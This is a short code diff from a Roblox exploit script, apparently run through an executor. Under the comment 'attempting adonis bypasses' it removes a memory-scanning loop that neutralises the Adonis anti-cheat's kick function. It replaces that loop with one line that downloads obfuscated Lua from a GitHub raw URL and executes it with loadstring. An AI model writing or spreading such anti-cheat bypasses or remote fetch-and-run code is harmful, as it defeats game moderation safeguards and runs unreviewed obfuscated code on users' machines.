@@ -14,15 +14,7 @@ local importCache = {}
 
 
 --attempting adonis bypasses
-for k, v in pairs(getgc(true)) do
-    if pcall(function() return rawget(v, "indexInstance") end) and
-        type(rawget(v, "indexInstance")) == "table" and
-        (rawget(v, "indexInstance"))[1] == "kick" then
-        v.tvk = {"kick", function()
-            return game.Workspace:WaitForChild("")
-        end}
-    end
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua"))() --changed to something that still works, obfuscated so this is gonna be a personal fork
 
 local Namecall
 
